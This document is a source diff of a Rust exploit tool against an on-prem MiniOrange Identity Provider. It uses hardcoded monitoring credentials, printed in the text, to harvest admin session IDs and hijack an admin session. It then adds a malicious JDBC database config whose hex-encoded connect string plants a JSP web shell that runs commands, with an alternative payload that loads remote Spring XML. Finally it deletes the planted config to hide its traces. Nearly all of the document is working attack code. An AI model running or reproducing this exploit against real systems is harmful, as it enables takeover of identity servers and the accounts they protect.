@@ -1,8 +1,18 @@
+/*
+    Clementine exploits a vulnerability in the on-prem MiniOrange Identity Provider. Using the hardcoded
+    credentials (moadminidp:P@ssw0rd$987123) for the monitoring servlet, we can access a page that lists
+    the names of cache keys used by Apache Shiro. The names of the keys match session IDs for logged in
+    users of the admin dashboard.
+
+    We can perform session fixation using these IDs to access the post-auth attack surface. Once logged in
+    as an admin, we can add a new
+)
+ */
 use clap::Parser;
 use regex::Regex;
 use reqwest::blocking::Client;
 use reqwest_cookie_store::CookieStoreMutex;
-use std::{collections::HashSet, error::Error, sync::Arc, thread};
+use std::{collections::HashSet, error::Error, sync::Arc, thread, time::Duration};
 use url::Url;
 
 #[derive(thiserror::Error, Debug, Clone)]
@@ -21,6 +31,12 @@ pub enum SploitError {
 
     #[error("Command shell failed to execute")]
     CmdShellFailed,
+
+    #[error("Failed to cleanup malicious database object")]
+    DatabaseCleanupFailed,
+
+    #[error("Failed to find database identifier for cleanup")]
+    DatabaseIdentifierNotFound,
 }
 
 struct Sploit {
@@ -49,6 +65,7 @@ impl Sploit {
         let re = Regex::new(r"([a-z0-9]{32})").unwrap();
 
         let url = self.target.join("/monitoring")?;
+        // Add the hardcoded monitoring creds to our Authorization header
         let resp = Client::new()
             .get(url)
             .header(
@@ -67,6 +84,32 @@ impl Sploit {
         }
 
         Ok(sessions.into_iter().collect())
+    }
+
+    // TODO: Need to match something of the form `<a  class="deleteIdpLink red" data-idpid="13" data-idpname="clementine">`
+    fn grep_db_id(&self, identifier: &str) -> Result<u32, Box<dyn Error>> {
+        let re = Regex::new(
+            // lol
+            format!(
+                r#"<a\s+class="deleteIdpLink red"\s+data-idpid="(\d+)"\s+data-idpname="{}">"#,
+                identifier
+            )
+            .as_str(),
+        )
+        .unwrap();
+        let url = self.target.join("/admin/customer/listuserstores")?;
+        let resp = self.client.get(url).send()?.text()?;
+
+        match re.captures(&resp) {
+            Some(caps) => match caps.get(1) {
+                Some(cap) => {
+                    // Our regex puts only numbers in the match group, so we unwrap here
+                    return Ok(cap.as_str().parse::<u32>().unwrap());
+                }
+                None => return Err(Box::new(SploitError::DatabaseIdentifierNotFound)),
+            },
+            None => return Err(Box::new(SploitError::DatabaseIdentifierNotFound)),
+        }
     }
 
     pub fn impersonate_admin(&mut self) -> Result<(), Box<dyn Error>> {
@@ -110,7 +153,19 @@ impl Sploit {
     pub fn add_malicious_database(&self) -> Result<(), Box<dyn Error>> {
         let url = self.target.join("/admin/customer/savedatabaseidpconfig")?;
         let csrf_token = self.get_csrf_token()?;
-        let payload = format!("struts.token.name=token&token={}&idpConfiguration.identifier=hax123&idpConfiguration.databaseType=PGSQL&idpConfiguration.databaseHost=jdbc%3Apostgresql%3A%2F%2Fhost.docker.internal%3A8899%2Fblah%3FsocketFactory%3Dorg.springframework.context.support.FileSystemXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fhost.docker.internal%3A8000%2Ftrigger.xml&idpConfiguration.databaseAdminUsername=admin&idpConfiguration.databaseAdminPassword=admin&idpConfiguration.databaseUserTablename=users&idpConfiguration.databaseUsernameColumn=username&idpConfiguration.databasePasswordColumn=password&idpConfiguration.databaseactiveusers=&__checkbox_idpConfiguration.endUserLogin=true&__checkbox_idpConfiguration.databaseSyncUsers=true&idpConfiguration.databaseHashing=None&idpConfiguration.domainMapping=&__checkbox_idpConfiguration.databaseAuthenticationViaMiniorange=true&__checkbox_idpConfiguration.sendConfiguredAttributes=true&QueryStringsMapping%5B%27check_user_query%27%5D=&QueryStringsMapping%5B%27create_user_query%27%5D=&QueryStringsMapping%5B%27update_user_query%27%5D=&QueryStringsMapping%5B%27delete_user_query%27%5D=&save=Save", csrf_token);
+        // Leaving this payload commented out, this relies on the well known socketFactoryArg
+        // gadget entrypoint and org.springframework.context.support.FileSystemXmlApplicationContext
+        //let payload = format!("struts.token.name=token&token={}&idpConfiguration.identifier=clementine&idpConfiguration.databaseType=PGSQL&idpConfiguration.databaseHost=jdbc%3Apostgresql%3A%2F%2Fhost.docker.internal%3A8899%2Fblah%3FsocketFactory%3Dorg.springframework.context.support.FileSystemXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fhost.docker.internal%3A8000%2Ftrigger.xml&idpConfiguration.databaseAdminUsername=admin&idpConfiguration.databaseAdminPassword=admin&idpConfiguration.databaseUserTablename=users&idpConfiguration.databaseUsernameColumn=username&idpConfiguration.databasePasswordColumn=password&idpConfiguration.databaseactiveusers=&__checkbox_idpConfiguration.endUserLogin=true&__checkbox_idpConfiguration.databaseSyncUsers=true&idpConfiguration.databaseHashing=None&idpConfiguration.domainMapping=&__checkbox_idpConfiguration.databaseAuthenticationViaMiniorange=true&__checkbox_idpConfiguration.sendConfiguredAttributes=true&QueryStringsMapping%5B%27check_user_query%27%5D=&QueryStringsMapping%5B%27create_user_query%27%5D=&QueryStringsMapping%5B%27update_user_query%27%5D=&QueryStringsMapping%5B%27delete_user_query%27%5D=&save=Save", csrf_token);
+
+        // The following payload results in blind command execution, using the same
+        // /idp/cmd.jsp?cmd=blah path. You can use this if the target is unable to connect back out
+        // of the network to retrieve a stage 2. This relies on injecting EL expression into a new JSP
+        // page by intentionally failing the database connection with log level TRACE on, which will
+        // write the full error message and connect string into the file specified by `loggerFile`,
+        // including parameters in the connect string. We stuff an EL expression into the
+        // ApplicationName parameter for this payload. EL expressions are a bit limited.
+        let payload = format!("struts.token.name=token&token={}&idpConfiguration.identifier=clementine&idpConfiguration.databaseType=PGSQL&idpConfiguration.databaseHost=%6a%64%62%63%3a%70%6f%73%74%67%72%65%73%71%6c%3a%2f%2f%68%6f%73%74%2e%64%6f%63%6b%65%72%2e%69%6e%74%65%72%6e%61%6c%3a%38%38%39%39%2f%6d%79%64%62%3f%41%70%70%6c%69%63%61%74%69%6f%6e%4e%61%6d%65%3d%24%7b%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%70%61%72%61%6d%2e%63%6d%64%29%7d%26%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%54%52%41%43%45%26%6c%6f%67%67%65%72%46%69%6c%65%3d%2e%2f%6d%6f%61%73%2f%69%64%70%2f%63%6d%64%2e%6a%73%70%26%6c%6f%67%69%6e%54%69%6d%65%6f%75%74%3d%31&idpConfiguration.databaseAdminUsername=admin&idpConfiguration.databaseAdminPassword=admin&idpConfiguration.databaseUserTablename=users&idpConfiguration.databaseUsernameColumn=username&idpConfiguration.databasePasswordColumn=password&idpConfiguration.databaseactiveusers=&__checkbox_idpConfiguration.endUserLogin=true&__checkbox_idpConfiguration.databaseSyncUsers=true&idpConfiguration.databaseHashing=None&idpConfiguration.domainMapping=&__checkbox_idpConfiguration.databaseAuthenticationViaMiniorange=true&__checkbox_idpConfiguration.sendConfiguredAttributes=true&QueryStringsMapping%5B%27check_user_query%27%5D=&QueryStringsMapping%5B%27create_user_query%27%5D=&QueryStringsMapping%5B%27update_user_query%27%5D=&QueryStringsMapping%5B%27delete_user_query%27%5D=&save=Save", csrf_token);
+
         let resp = self
             .client
             .post(url)
@@ -124,13 +179,39 @@ impl Sploit {
         Ok(())
     }
 
+    pub fn cleanup_malicious_db(&self) -> Result<(), Box<dyn Error>> {
+        let db_id = self.grep_db_id("clementine")?;
+        self.delete_db(db_id)?;
+        Ok(())
+    }
+
+    fn delete_db(&self, id: u32) -> Result<(), Box<dyn Error>> {
+        let url = self.target.join("/admin/customer/deleteuserstoreconfig")?;
+        let csrf_token = self.get_csrf_token()?;
+        let payload = format!(
+            "struts.token.name=token&token={}&idpConfiguration.id={}",
+            csrf_token, id
+        );
+        let resp = self
+            .client
+            .post(url)
+            .body(payload)
+            .header("Content-Type", "application/x-www-form-urlencoded")
+            .send()?;
+        if resp.status() != 200 {
+            println!("Cleanup Failed: Status {}", resp.status());
+            return Err(Box::new(SploitError::DatabaseCleanupFailed));
+        }
+        Ok(())
+    }
+
     pub fn trigger_rce(&self) -> Result<(), Box<dyn Error>> {
         let url = self
             .target
             .join("/admin/customer/testdatabaseconfiguration")?;
         let csrf_token = self.get_csrf_token()?;
         let payload = format!(
-            "testIdentifier=hax123&struts.token.name=token&token={}&testUsername=a&testPassword=a",
+            "testIdentifier=clementine&struts.token.name=token&token={}&testUsername=a&testPassword=a",
             csrf_token
         );
         let resp = self
@@ -203,9 +284,13 @@ fn main() -> Result<(), Box<dyn Error>> {
         sploit.add_malicious_database()?;
         println!("[*] Triggering connection");
         sploit.trigger_rce()?;
+        thread::sleep(Duration::from_secs(3));
+        println!("[*] Cleaning out malicious jdbc");
+        sploit.cleanup_malicious_db()?;
         // This sleep seems to be required. If we try to access the shell too quickly, sometimes
-        // we get back a 200 but with no response body.
-        thread::sleep_ms(2000);
+        // we get back a 200 but with no response body. Probably something to do with a combination
+        // of caching and optimized code generation from the JSP.
+        thread::sleep(Duration::from_secs(3));
         println!("[*] pop pop");
     }
     let output = sploit.run_cmd(&args.cmd)?;
